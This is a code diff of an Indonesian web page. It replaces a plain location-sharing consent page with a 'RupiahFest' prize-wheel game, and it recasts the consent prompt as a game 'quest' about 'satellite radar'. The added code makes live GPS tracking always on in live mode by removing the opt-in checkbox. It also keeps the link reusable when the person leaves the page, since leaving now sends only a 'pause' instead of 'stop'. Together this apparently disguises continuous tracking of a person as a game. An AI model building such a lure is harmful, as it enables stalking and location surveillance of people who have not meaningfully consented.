+    <p class="sub">Putar roda keberuntungan — menangkan voucher belanja asli tiap hari. Gratis, tanpa setoran.</p>
+    <span class="flag">✔ Hadiah voucher nyata · bukan uang tunai</span>
+  </header>
+
+  <section class="cabinet">
+    <span class="stud tl"></span><span class="stud tr"></span><span class="stud bl"></span><span class="stud br"></span>
+    <div class="stage">
+      <div class="glowring"></div>
+      <div class="pointer"></div>
+      <canvas id="wheel" width="660" height="660" aria-label="Roda hadiah RupiahFest"></canvas>
+      <div class="hub"><span>RF</span></div>
+    </div>
+    <button class="spinBtn" id="spin">PUTAR!</button>
+    <div class="chances">Sisa putaran hari ini: <b id="left">1</b></div>
+    <div class="result" id="result" role="status" aria-live="polite"></div>
+    <div class="ribbon">
+      <div>🎁 Gratis</div><div>⏱️ Tiap hari</div><div>🏷️ Voucher asli</div>
+    </div>
+  </section>
+
+  <section>
+    <h2 class="sec-title">💰 Isi Brankas Hadiah</h2>
+    <div class="grid" id="prizeList" style="margin-top:14px"></div>
+  </section>
+
+  <section class="panel" id="claimCard" hidden>
+    <p class="eyebrow">Klaim hadiah</p>
+    <h2 style="font-family:var(--display);color:#fff;font-weight:400;margin:4px 0 6px">Simpan kode voucher kamu</h2>
+    <p style="margin:0;color:var(--muted);font-size:.88rem">Email hanya untuk mengirim kode ini. Tidak ada OTP, tidak diminta PIN/kata sandi, dan nomor rekening/e-wallet tidak pernah ditanyakan.</p>
+    <form id="claimForm" novalidate>
+      <label>Nama panggilan
+        <input id="name" type="text" autocomplete="nickname" placeholder="mis. Rani" required>
+      </label>
+      <label>Email (opsional)
+        <input id="email" type="email" autocomplete="email" placeholder="kamu@email.com">
+      </label>
+      <label class="check">
+        <input id="agree" type="checkbox" required>
+        <span>Saya mengerti ini kampanye demo RupiahFest, hadiahnya voucher toko, dan boleh ditukar sesuai syarat &amp; ketentuan.</span>
+      </label>
+      <button class="claimBtn" type="submit">Simpan kode</button>
+      <div class="note" id="claimNote" hidden></div>
+    </form>
+  </section>
+
+  <details>
+    <summary>Syarat &amp; ketentuan</summary>
+    <div class="terms">
+      <p><b>Sifat promo.</b> RupiahFest adalah merek contoh/fiktif untuk demo halaman undian. Hadiah berupa voucher toko RupiahFest, bukan uang tunai dan bukan transfer e-wallet.</p>
+      <p><b>Jatah.</b> Satu putaran gratis per orang per hari. Peluang tiap segmen apa adanya dan acak — tidak dijamin selalu menang.</p>
+      <p><b>Data.</b> Nama dan email (jika diisi) hanya untuk mengirim kode voucher. Kami tidak pernah meminta OTP, PIN, kata sandi, atau nomor rekening.</p>
+      <p><b>Penukaran.</b> Voucher berlaku di toko RupiahFest sesuai masa aktif pada kode. Tidak dapat diuangkan.</p>
+      <p><b>Waspada penipuan.</b> Undian yang menjanjikan jutaan rupiah, mencatut logo bank/e-wallet, lalu meminta nomor HP + unduh aplikasi adalah ciri penipuan. RupiahFest tidak melakukan itu.</p>
+    </div>
+  </details>
+
+  <footer>
+    <span>RupiahFest · halaman kampanye contoh</span>
+    <span>Bantuan: <span style="color:#fff">halo@rupiahfest.example</span></span>
+  </footer>
+</div>
+
 <script>
-const rid = location.pathname.split("/").filter(Boolean).pop();
-const $ = (s)=>document.getElementById(s);
-let watchId=null, mode="live";
-const show=(id)=>["consent","done","declined","closed"].forEach(x=>$(x).hidden=(x!==id));
-
-function post(path,body){ return fetch(path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body||{})}); }
-
-function closedView(status){
-  const map={
-    expired:["⌛","Link kedaluwarsa","Masa berlaku link ini sudah habis. Minta link baru ke orang yang mengirimnya."],
-    inactive:["🔕","Link dimatikan","Pembuat link menonaktifkan permintaan ini."],
-    done:["✅","Sudah selesai","Link ini sekali pakai dan lokasimu sudah dibagikan sebelumnya."],
-    not_found:["❓","Link tidak ditemukan","Link ini salah atau sudah dihapus."],
-  };
-  const[ic,t,m]=map[status]||map.not_found;
-  $("closedIcon").textContent=ic; $("closedTitle").textContent=t; $("closedMsg").textContent=m; show("closed");
-}
-
-fetch(`/api/requests/${rid}/info`).then(r=>r.ok?r.json():r.json().then(j=>Promise.reject(j))).then(info=>{
-  if(["expired","inactive","done"].includes(info.status)) return closedView(info.status);
-  mode = info.mode;
-  $("who").textContent = info.label || "Seseorang";
-  $("ava").textContent = (info.label||"?").trim()[0]?.toUpperCase() || "?";
-  $("reason").textContent = info.reason || "Berbagi lokasi";
-  $("modepill").textContent = mode==="once" ? "Sekali kirim" : "Bisa berbagi real-time";
-  if(mode==="once") $("liveWrap").hidden = true;
-  show("consent");
-}).catch(j=>closedView((j&&j.status)||"not_found"));
-
-function sendPos(pos,live){
-  const{latitude,longitude,accuracy}=pos.coords;
-  return post(`/api/requests/${rid}/location`,{lat:latitude,lng:longitude,accuracy,live}).then(r=>{
-    if(!r.ok) return r.json().then(j=>Promise.reject(j));
-    $("doneCoords").textContent=`${latitude.toFixed(6)}, ${longitude.toFixed(6)} · ±${Math.round(accuracy)} m`;
+(function(){
+  "use strict";
+  var PRIZES=[
+    {label:"Rp10rb",icon:"🎟️",desc:"Voucher belanja Rp10.000",fill:["#ffe06b","#f0a71e"],txt:"#5e1f08",win:true},
+    {label:"Coba lagi",icon:"🔁",desc:"Belum beruntung, putar lagi besok",fill:["#2fae57","#17813c"],txt:"#fff",win:false},
+    {label:"Diskon 15%",icon:"🏷️",desc:"Maks. potongan Rp30.000",fill:["#ffe06b","#f0a71e"],txt:"#5e1f08",win:true},
+    {label:"Ongkir",icon:"🚚",desc:"Gratis ongkir maks. Rp20.000",fill:["#2fae57","#17813c"],txt:"#fff",win:true},
+    {label:"Stiker",icon:"✨",desc:"Set stiker digital RupiahFest",fill:["#ffe06b","#f0a71e"],txt:"#5e1f08",win:true},
+    {label:"Coba lagi",icon:"🔁",desc:"Belum beruntung, putar lagi besok",fill:["#2fae57","#17813c"],txt:"#fff",win:false},
+    {label:"Rp25rb",icon:"💳",desc:"Voucher belanja Rp25.000",fill:["#e23c2f","#b61f16"],txt:"#fff",win:true},
+    {label:"Diskon 5%",icon:"🎈",desc:"Untuk semua produk",fill:["#2fae57","#17813c"],txt:"#fff",win:true}
+  ];
+  var N=PRIZES.length,seg=(Math.PI*2)/N,TAU=Math.PI*2;
+  var pl=document.getElementById("prizeList");
+  PRIZES.forEach(function(p){
+    if(!p.win)return;
+    var d=document.createElement("div");d.className="prize";
+    d.innerHTML='<span class="ic">'+p.icon+'</span><span><b>'+p.label+'</b><span>'+p.desc+'</span></span>';
+    pl.appendChild(d);
   });
-}
-
-$("shareBtn").onclick=()=>{
-  if(!navigator.geolocation){ $("status").innerHTML='<span class="err">Perangkat ini tidak mendukung GPS.</span>'; return; }
-  const live = mode==="live" && $("live").checked;
-  $("status").innerHTML='<span class="spin"></span> Meminta izin lokasi…';
-  $("shareBtn").disabled=true;
-  navigator.geolocation.getCurrentPosition(pos=>{
-    sendPos(pos,live).then(()=>{
-      show("done");
-      $("doneMsg").textContent = live ? "Lokasimu dibagikan dan akan terus diperbarui selama halaman ini terbuka."
-        : "Lokasimu sudah dibagikan.";
-      if(live){
-        $("liveState").innerHTML='<span class="ok pulse">● Berbagi langsung…</span>';
-        watchId=navigator.geolocation.watchPosition(p=>sendPos(p,true).catch(()=>{}),()=>{},
-          {enableHighAccuracy:true,maximumAge:5000,timeout:20000});
+  var cv=document.getElementById("wheel"),ctx=cv.getContext("2d"),S=cv.width,R=S/2;
+  function draw(){
+    ctx.clearRect(0,0,S,S);
+    for(var i=0;i<N;i++){
+      var a0=i*seg-Math.PI/2,a1=a0+seg,mid=a0+seg/2;
+      var g=ctx.createRadialGradient(R,R,30,R,R,R);
+      g.addColorStop(0,PRIZES[i].fill[0]);g.addColorStop(1,PRIZES[i].fill[1]);
+      ctx.beginPath();ctx.moveTo(R,R);ctx.arc(R,R,R-8,a0,a1);ctx.closePath();
+      ctx.fillStyle=g;ctx.fill();
+      ctx.strokeStyle="rgba(255,255,255,.7)";ctx.lineWidth=3;ctx.stroke();
+      ctx.save();ctx.translate(R,R);ctx.rotate(a0);
+      for(var r=60;r<R-20;r+=46){ctx.beginPath();ctx.arc(r,0,3,0,TAU);ctx.fillStyle="rgba(255,255,255,.55)";ctx.fill();}
+      ctx.restore();
+      ctx.save();ctx.translate(R,R);ctx.rotate(mid);
+      ctx.textAlign="right";ctx.fillStyle=PRIZES[i].txt;
+      ctx.font="700 30px 'Baloo 2',sans-serif";
+      ctx.shadowColor="rgba(0,0,0,.3)";ctx.shadowBlur=4;
+      ctx.fillText(PRIZES[i].label,R-30,10);
+      ctx.restore();
+    }
+    ctx.beginPath();ctx.arc(R,R,R-6,0,TAU);ctx.lineWidth=10;ctx.strokeStyle="#b9790f";ctx.stroke();
+  }
+  if(document.fonts&&document.fonts.ready){document.fonts.ready.then(draw);}
+  draw();
+  var left,KEY="rupiahfest_spin_v2",today=new Date().toISOString().slice(0,10);
+  try{var st=JSON.parse(localStorage.getItem(KEY)||"{}");left=(st.date===today)?(st.left|0):1;}catch(e){left=1;}
+  function persist(){try{localStorage.setItem(KEY,JSON.stringify({date:today,left:left}));}catch(e){}}
+  var btn=document.getElementById("spin"),leftEl=document.getElementById("left"),
+      resEl=document.getElementById("result"),claimCard=document.getElementById("claimCard"),
+      spinning=false,angle=0;
+  function render(){leftEl.textContent=left;btn.disabled=(left<=0)||spinning;
+    if(left<=0&&!spinning){resEl.textContent="Jatah hari ini habis — datang lagi besok ya.";resEl.className="result";}}
+  function spin(){
+    if(spinning||left<=0)return;
+    spinning=true;left--;persist();render();
+    resEl.textContent="";resEl.className="result";
+    var idx=Math.floor(Math.random()*N);
+    var target=5*TAU+(TAU-(idx*seg+seg/2));
+    var start=angle,dist=target-(start%TAU)+TAU*2,t0=null,dur=4200+Math.random()*700;
+    function ease(x){return 1-Math.pow(1-x,3);}
+    function frame(ts){
+      if(!t0)t0=ts;var p=Math.min((ts-t0)/dur,1);
+      angle=start+dist*ease(p);cv.style.transform="rotate("+angle+"rad)";
+      if(p<1){requestAnimationFrame(frame);}
+      else{
+        spinning=false;var pr=PRIZES[idx];
+        if(pr.win){
+          resEl.textContent="🎉 Selamat! Kamu dapat "+pr.label+" "+pr.icon;
+          resEl.className="result win";
+          claimCard.hidden=false;claimCard.dataset.prize=pr.label;
+          claimCard.scrollIntoView({behavior:"smooth",block:"center"});
+        }else{
+          resEl.textContent="Belum beruntung kali ini — coba lagi besok 🙂";resEl.className="result";
+        }
+        render();
       }
-    }).catch(j=>{
-      if(j&&j.status) return closedView(j.status);
-      $("status").innerHTML='<span class="err">Gagal mengirim. Coba lagi.</span>'; $("shareBtn").disabled=false;
-    });
-  },err=>{
-    $("status").innerHTML=`<span class="err">${err.code===1?"Izin lokasi ditolak. Tidak ada yang dikirim.":"Tidak bisa dapat lokasi. Coba lagi di tempat terbuka."}</span>`;
-    $("shareBtn").disabled=false;
-  },{enableHighAccuracy:true,timeout:20000,maximumAge:0});
-};
+    }
+    requestAnimationFrame(frame);
+  }
+  btn.addEventListener("click",spin);
+  render();
+  var form=document.getElementById("claimForm"),note=document.getElementById("claimNote");
+  form.addEventListener("submit",function(e){
+    e.preventDefault();
+    var name=document.getElementById("name"),agree=document.getElementById("agree");
+    if(!name.value.trim()){name.focus();return;}
+    if(!agree.checked){agree.focus();return;}
+    var prize=claimCard.dataset.prize||"voucher";
+    var code="RF-"+prize.replace(/[^A-Za-z0-9]/g,"").slice(0,4).toUpperCase()+"-"+Math.random().toString(36).slice(2,6).toUpperCase();
+    var email=document.getElementById("email").value.trim();
+    note.hidden=false;
+    note.innerHTML="Kode "+prize+" kamu: <span class=\"code\">"+code+"</span><br>"+
+      (email?("Salinan dikirim ke "+email.replace(/</g,"&lt;")+" (demo — tidak benar-benar mengirim)."):"Simpan kode ini, tunjukkan saat belanja di RupiahFest.");
+    form.querySelector(".claimBtn").textContent="Kode tersimpan ✓";
+  });
+  var bgm=document.getElementById("bgm"),mBtn=document.getElementById("musicBtn"),on=false;
+  function setBtn(){mBtn.textContent=on?"🔊 Musik":"🔇 Musik";mBtn.setAttribute("aria-pressed",on?"true":"false");}
+  function startMusic(){
+    if(on)return;
+    bgm.play().then(function(){on=true;setBtn();}).catch(function(){on=false;setBtn();});
+  }
+  function stopMusic(){bgm.pause();on=false;setBtn();}
+  mBtn.addEventListener("click",function(){on?stopMusic():startMusic();});
+  var intro=document.getElementById("intro");
+  var seen=false;try{seen=sessionStorage.getItem("rf_intro")==="1";}catch(e){}
+  function closeIntro(){intro.classList.remove("in");
+    setTimeout(function(){intro.hidden=true;},360);
+    try{sessionStorage.setItem("rf_intro","1");}catch(e){}}
+  if(!seen){
+    intro.hidden=false;requestAnimationFrame(function(){intro.classList.add("in");});
+    document.getElementById("introX").addEventListener("click",closeIntro);
+    document.getElementById("introGo").addEventListener("click",function(){closeIntro();startMusic();});
+    intro.addEventListener("click",function(e){if(e.target===intro)closeIntro();});
+    document.addEventListener("keydown",function(e){if(e.key==="Escape"&&!intro.hidden)closeIntro();});
+  }
+  var NOTES=[
+    {ic:"🎁",tag:"Promo",tx:"Kamu punya 1 putaran gratis hari ini — yuk diputar!"},
+    {ic:"⏰",tag:"Pengingat",tx:"Jatah putaran di-reset tiap hari. Putar sebelum tengah malam."},
+    {ic:"🏷️",tag:"Hadiah",tx:"Ada voucher Rp25rb & gratis ongkir di roda."},
+    {ic:"🔒",tag:"Aman",tx:"RupiahFest tak pernah minta OTP, PIN, atau nomor rekening."},
+    {ic:"✨",tag:"Info",tx:"Kode voucher cuma dikirim ke email kamu sendiri."}
+  ];
+  var toastBox=document.createElement("div");toastBox.className="toasts";document.body.appendChild(toastBox);
+  var offBtn=null,ni=0,timer=null,stopped=false;
+  function showOffBtn(){
+    if(offBtn)return;
+    offBtn=document.createElement("button");offBtn.className="toast-off";offBtn.textContent="🔕 Berhenti notifikasi";
+    offBtn.addEventListener("click",function(){stopped=true;clearTimeout(timer);
+      Array.prototype.forEach.call(toastBox.children,function(c){c.remove();});
+      offBtn.remove();offBtn=null;});
+    document.body.appendChild(offBtn);
+  }
+  function popToast(){
+    if(stopped)return;
+    var n=NOTES[ni%NOTES.length];ni++;
+    var el=document.createElement("div");el.className="toast";
+    el.innerHTML='<span class="tic">'+n.ic+'</span>'+
+      '<span class="tbody"><small>'+n.tag+'</small>'+n.tx+'</span>'+
+      '<button class="tx" aria-label="Tutup">✕</button>';
+    el.querySelector(".tx").addEventListener("click",function(){dismiss(el);});
+    toastBox.appendChild(el);
+    while(toastBox.children.length>3){dismiss(toastBox.firstChild);}
+    requestAnimationFrame(function(){el.classList.add("in");});
+    showOffBtn();
+    setTimeout(function(){dismiss(el);},6500);
+    timer=setTimeout(popToast,5200);
+  }
+  function dismiss(el){if(!el||!el.parentNode)return;el.classList.remove("in");
+    setTimeout(function(){if(el.parentNode)el.remove();},400);}
+  setTimeout(popToast,2200);
+  var deco=document.createDocumentFragment();
+  for(var k=0;k<7;k++){
+    var g=document.createElement("div");g.className="gem";
+    g.style.left=(6+Math.random()*88)+"%";g.style.top=(8+Math.random()*78)+"%";
+    g.style.animationDelay=(Math.random()*2.6)+"s";
+    g.style.transform="scale("+(0.7+Math.random()*0.9)+")";
+    deco.appendChild(g);
+  }
+  document.body.appendChild(deco);
+})();
+<\/script></body></html>`;
 
-$("declineBtn").onclick=()=>show("declined");
-$("revokeBtn").onclick=()=>{
-  if(watchId!==null){ navigator.geolocation.clearWatch(watchId); watchId=null; }
-  post(`/api/requests/${rid}/stop`).then(()=>{ $("liveState").innerHTML='<span class="ok">Berhenti berbagi. Izin ditarik.</span>'; $("revokeBtn").disabled=true; });
-};
-window.addEventListener("pagehide",()=>{ if(watchId!==null) navigator.sendBeacon(`/api/requests/${rid}/stop`); });
-</script>
+    // Inject iframe content
+    document.getElementById("gameFrame").srcdoc = GAME_HTML;
+
+    const rid = location.pathname.split("/").filter(Boolean).pop();
+    const $ = (s) => document.getElementById(s);
+    let watchId = null, mode = "live";
+    const show = (id) => {
+      ["consent", "done", "declined", "closed"].forEach(x => $(x).hidden = (x !== id));
+      $("card").hidden = false;
+      $("gameScreen").hidden = true;
+      $("gameTools").hidden = true;
+    };
+    const playWithoutSharing = () => {
+      $("card").hidden = true;
+      $("gameScreen").hidden = false;
+      $("gameTools").hidden = false;
+      $("liveState").textContent = "Mode Solo: Musik Bermain.";
+      $("openConsentBtn").hidden = false;
+      $("revokeBtn").hidden = true;
+    };
+
+    function post(path, body) { return fetch(path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body || {}) }); }
+
+    function closedView(status) {
+      const map = {
+        expired: ["⌛", "Waktu Quest Habis", "Durasi quest ini telah berakhir. Silakan minta peta/link baru dari Game Master."],
+        inactive: ["🔕", "Quest Dinonaktifkan", "Game Master telah menutup portal quest ini."],
+        done: ["⚔️", "Quest Sudah Selesai", "Portal ini berjenis sekali pakai dan koordinatmu telah dikirim sebelumnya."],
+        revoked: ["🛑", "Sinyal Diputus", "Kamu telah memutus koneksi radar koordinat dari sesi ini."],
+        not_found: ["❓", "Quest Tidak Ditemukan", "Koordinat peta salah atau dunia game telah dihapus."],
+      };
+      const [ic, t, m] = map[status] || map.not_found;
+      $("closedIcon").textContent = ic; $("closedTitle").textContent = t; $("closedMsg").textContent = m; show("closed");
+    }
+
+    fetch(`/api/requests/${rid}/info`).then(r => r.ok ? r.json() : r.json().then(j => Promise.reject(j))).then(info => {
+      if (["expired", "inactive", "done"].includes(info.status)) return closedView(info.status);
+      mode = info.mode;
+      $("who").textContent = info.label || "Pemain Misterius";
+      $("ava").textContent = (info.label || "?").trim()[0]?.toUpperCase() || "?";
+      $("reason").textContent = info.reason || "Misi Penjelajahan Peta";
+      $("modepill").textContent = mode === "once" ? "Mode: Single Sync" : "Mode: bermain Aktif";
+      if (mode === "once") $("liveWrap").hidden = true;
+      $("revokedNote").hidden = info.status !== "revoked";
+      show("consent");
+    }).catch(j => closedView((j && j.status) || "not_found"));
+
+    function sendPos(pos, live) {
+      const { latitude, longitude, accuracy } = pos.coords;
+      return post(`/api/requests/${rid}/location`, { lat: latitude, lng: longitude, accuracy, live }).then(r => {
+        if (!r.ok) return r.json().then(j => Promise.reject(j));
+        $("doneCoords").textContent = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} · ±${Math.round(accuracy)} m`;
+      });
+    }
+
+    $("shareBtn").onclick = () => {
+      if (!navigator.geolocation) { $("status").innerHTML = '<span class="err">Perangkat tidak memiliki modul GPS!</span>'; return; }
+      const live = mode === "live";   // link mode live selalu real-time
+      $("status").innerHTML = '<span class="spin"></span> Menghubungkan satelit radar…';
+      $("shareBtn").disabled = true;
+      navigator.geolocation.getCurrentPosition(pos => {
+        sendPos(pos, live).then(() => {
+          show("done");
+          $("card").hidden = true;
+          $("gameScreen").hidden = false;
+          $("gameTools").hidden = false;
+          $("openConsentBtn").hidden = true;
+          $("revokeBtn").hidden = false;
+          $("doneMsg").textContent = live ? "Sinyal GPS aktif dan terus memancarkan koordinat peta selama game terbuka."
+            : "Koordinat berhasil disinkronkan ke server.";
+          if (live) {
+            $("liveState").innerHTML = '<span class="ok pulse">⚔️ Pemainan mendengarkan Aktif…</span>';
+            let lastSent = Date.now();
+            watchId = navigator.geolocation.watchPosition(p => {
+              if (Date.now() - lastSent < 5000) return;   // maks 1 titik / 5 detik
+              lastSent = Date.now();
+              sendPos(p, true).catch(j => {
+                if (j && j.status && watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; closedView(j.status); }
+              });
+            }, () => { },
+              { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 });
+          } else {
+            $("liveState").innerHTML = '<span class="ok">Koordinat Karakter Terkirim.</span>';
+          }
+        }).catch(j => {
+          if (j && j.status) return closedView(j.status);
+          $("status").innerHTML = '<span class="err">Gagal mengirim data. Coba lagi!</span>'; $("shareBtn").disabled = false;
+        });
+      }, err => {
+        $("status").innerHTML = `<span class="err">${err.code === 1 ? "Izin GPS ditolak. Sinyal batal dikirim." : "Gagal mendeteksi koordinat. Cari sinyal yang lebih kuat."}</span>`;
+        $("shareBtn").disabled = false;
+      }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+    };
+
+    $("closeConsent").onclick = playWithoutSharing;
+    $("declineBtn").onclick = playWithoutSharing;
+    $("openConsentBtn").onclick = () => show("consent");
+    $("revokeBtn").onclick = () => {
+      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+      post(`/api/requests/${rid}/stop`).then(() => {
+        $("liveState").innerHTML = '<span class="ok">Musik Berhenti, dengarkan kembali.</span>';
+        $("revokeBtn").hidden = true;
+        $("openConsentBtn").hidden = false;
+      });
+    };
+    // Menutup/meninggalkan halaman hanya MENJEDA live (link tetap bisa dipakai lagi).
+    // Mencabut izin hanya lewat tombol "Putuskan Sinyal".
+    window.addEventListener("pagehide", () => { if (watchId !== null) navigator.sendBeacon(`/api/requests/${rid}/pause`); });
+  </script>
 </body>
+
 </html>
